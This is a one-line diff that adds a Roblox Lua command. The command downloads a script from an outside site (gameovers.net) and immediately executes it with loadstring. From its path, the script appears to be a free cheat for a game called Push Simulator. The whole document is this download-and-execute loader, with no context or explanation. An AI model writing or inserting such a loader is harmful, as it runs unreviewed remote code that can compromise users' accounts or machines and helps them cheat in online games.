@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/push_simulator/main.lua"))()
